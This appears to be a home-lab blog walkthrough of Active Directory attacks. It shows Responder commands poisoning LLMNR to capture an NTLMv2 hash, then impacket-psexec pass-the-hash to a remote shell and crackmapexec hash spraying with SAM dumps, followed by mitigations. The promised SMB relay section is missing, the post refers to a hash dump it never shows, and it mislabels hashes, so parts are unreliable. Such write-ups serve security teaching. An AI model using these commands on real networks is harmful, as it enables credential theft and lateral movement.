---
layout:	post
title:  "AD Initial-Attacks: LLMNR Poisoning & SMB Relay"
date:   2024-07-16 11:11:11 +0200
categories: [Active Directory]
tags: [Active Directory]
---

## Pre-requisites

[AD: Fundamentals (venuschhantel.com.np)](https://venuschhantel.com.np/posts/AD_Fundamentals/)

<br>

## AD Environment

The AD environment for the LLMNR poisoning and SMB relay attack walkthrough is illustrated in the image below.

![AD Environment](/images/2024-07-21-AD_Initial_Attacks_LLMNR Poisoning_&_SMB_Relay/1.png)

<br>

## LLMNR Poisoning

### LLMNR

LLMNR, or Link-Local Multicast Name Resolution, is a protocol based on DNS that allow name resolution for hosts on same local link. LLMNR is upgraded version of NBT-NS (NetBIOS Name Service) and is enabled by default. LLMNR perform name resolution when DNS is unavailable or DNS cannot resolve the name.

 In Windows, computer perform name resolution in same network with following hierarchy:

- Checks the hosts file of file system (C:\Windows\System32\drivers\etc\hosts)
- Checks the local DNS cache.
- Query DNS server on local network
- Sends LLMNR query

LLMNR works as follows:

- When a host requests an unknown domain name, LLMNR broadcasts a Name Resolution Request (NRR) packet to all devices on the network, asking for that hostname.
- If a device on the network has the requested hostname, it responds with a Name Resolution Response (NRP) containing its IP address to establish a connection.
- If the requested resource requires authentication, LLMNR sends the username and NTLMv2 hash of the requesting device to the device with that hostname.

The third step in above step is the **flaw** within LLMNR. It make it vulnerable to MITM attacks. Attackers can listen for those LLMNR request on UDP port 5355 and spoof as the requested name to grab the username and NTLMv2 hash.

<br>

### LLMNR Poisoning Walkthrough

To carry out LLMNR poisoning, we will use a tool called Responder from the ‘hecker’ machine. Execute the responder with following command to listen for any LLMNR requests made by devices on the network.

```bash
sudo responder -I eth0
```

Suppose the 'ape' user from PC1 mistypes the SMB share `\\banana\where`as `\\bananana\where`. Responder will spoof as the mistyped domain and respond, capturing the username and NTLMv2 hash of the ‘ape’ user.

Responder output the username and NTLMv2 hash of the ‘ape’ user as shown below.

```bash
[*] [MDNS] Poisoned answer sent to 192.168.190.129 for name bananana.local
[*] [MDNS] Poisoned answer sent to fe80::4927:ce11:d0aa:ff69 for name bananana.local
[*] [LLMNR]  Poisoned answer sent to fe80::4927:ce11:d0aa:ff69 for name bananana
[*] [LLMNR]  Poisoned answer sent to 192.168.190.129 for name bananana
[*] [MDNS] Poisoned answer sent to 192.168.190.129 for name bananana.local
[*] [MDNS] Poisoned answer sent to fe80::4927:ce11:d0aa:ff69 for name bananana.local
[*] [LLMNR]  Poisoned answer sent to fe80::4927:ce11:d0aa:ff69 for name bananana
[*] [LLMNR]  Poisoned answer sent to 192.168.190.129 for name bananana
[SMB] NTLMv2-SSP Client   : fe80::4927:ce11:d0aa:ff69
[SMB] NTLMv2-SSP Username : APEWITHINTERNET\ape
[SMB] NTLMv2-SSP Hash     : ape::APEWITHINTERNET:dbca3473cf3369e5:55371D0AEC7E4F4BF3F91AE109464849:0101000000000000001778E84DDBDA0172C995E4FFB10B9A0000000002000800560039004600300001001E00570049004E002D0056004F0035005400430051005200470036003200580004003400570049004E002D0056004F003500540043005100520047003600320058002E0056003900460030002E004C004F00430041004C000300140056003900460030002E004C004F00430041004C000500140056003900460030002E004C004F00430041004C0007000800001778E84DDBDA01060004000200000008003000300000000000000001000000002000008A8776E7A16EC4F7CD39A22D79EF9C298FB23C2205E64C7674485EC43FBD9D020A0010000000000000000000000000000000000009001A0063006900660073002F00620061006E0061006E0061006E0061000000000000000000                                                                                                                                 
[*] [NBT-NS] Poisoned answer sent to 192.168.190.129 for name BANANANA (service: File Server)
```

The obtained NTLMv2 hash can be cracked if the password is common or easily guessable. However, if the password is complex and difficult to crack, we can relay the NTLMv2 hash to authenticate on other devices, which will be covered in next section.

<br>


## Additional

Using the above dumped local account and NTLMv1 hash, we can perform pass-attack (pass-the-hash) to login to those local accounts.

```bash
impacket-psexec administrator@192.168.190.131 -hashes aad3b435b51404eeaad3b435b51404ee:5a4fe3581c32af7cab5b27c35f1713cd
```

```bash
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 192.168.190.131.....
[*] Found writable share ADMIN$
[*] Uploading file XIEkSgGb.exe
[*] Opening SVCManager on 192.168.190.131.....
[*] Creating service UDaV on 192.168.190.131.....
[*] Starting service UDaV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.4651]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
PC2
```

Also we can spray attack using the NTLMv1 hash over the network to identify all the devices where those local account are validated as well as dump local account NTLMv1 hash from SAM of validated devices.

```bash
crackmapexec smb 192.168.190.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:5a4fe3581c32af7cab5b27c35f1713cd --local-auth --sam
```

```bash
SMB         192.168.190.131 445    PC2              [*] Windows 10.0 Build 19041 x64 (name:PC2) (domain:PC2) (signing:False) (SMBv1:False)
SMB         192.168.190.130 445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:DC) (signing:True) (SMBv1:False)
SMB         192.168.190.129 445    PC1              [*] Windows 10.0 Build 19041 x64 (name:PC1) (domain:PC1) (signing:False) (SMBv1:False)
SMB         192.168.190.131 445    PC2              [+] PC2\administrator:5a4fe3581c32af7cab5b27c35f1713cd (Pwn3d!)
SMB         192.168.190.130 445    DC               [-] DC\administrator:5a4fe3581c32af7cab5b27c35f1713cd STATUS_LOGON_FAILURE 
SMB         192.168.190.129 445    PC1              [+] PC1\administrator:5a4fe3581c32af7cab5b27c35f1713cd (Pwn3d!)
SMB         192.168.190.131 445    PC2              [+] Dumping SAM hashes
SMB         192.168.190.129 445    PC1              [+] Dumping SAM hashes
SMB         192.168.190.131 445    PC2              Administrator:500:aad3b435b51404eeaad3b435b51404ee:5a4fe3581c32af7cab5b27c35f1713cd:::
SMB         192.168.190.129 445    PC1              Administrator:500:aad3b435b51404eeaad3b435b51404ee:5a4fe3581c32af7cab5b27c35f1713cd:::
SMB         192.168.190.131 445    PC2              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.190.129 445    PC1              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.190.131 445    PC2              DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.190.129 445    PC1              DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.190.131 445    PC2              WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:948865a45cd982b0c7adb86ad0bf5614:::
SMB         192.168.190.129 445    PC1              WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:bcd1933b0c8639d3e03ea418c5add9ab:::
SMB         192.168.190.131 445    PC2              monkee:1001:aad3b435b51404eeaad3b435b51404ee:7963148d4ea1e2636dbfaeb4b0fa84db:::
SMB         192.168.190.131 445    PC2              [+] Added 5 SAM hashes to the database
SMB         192.168.190.129 445    PC1              ape:1001:aad3b435b51404eeaad3b435b51404ee:0c9d2bfafd647e8bca4f77479726bc64:::
SMB         192.168.190.129 445    PC1              [+] Added 5 SAM hashes to the database
```

<br>

## Mitigations

- Disable LLMNR and NBT-NS from group policy
    - To disable LLMNR
        - Computer Configuration > Administrative Templates > Network > DNS Client
            - Set ‘Turn off Multicast Name Resolution’ to Enabled
    - To disable NBT-NS
        - Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab
            - Set ‘Disable NetBIOS over TCP/IP’
- Enable SMB Signing from group policy
    - Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
        - Enable
            - **Microsoft network client: Digitally sign communications (always)**
            - **Microsoft network client: Digitally sign communications (if server agrees)**
            - **Microsoft network server: Digitally sign communications (always)**
            - **Microsoft network server: Digitally sign communications (if client agrees)**
- Disable NTLM authentication on network
- Network segmentations
- Follow principal of least privilege
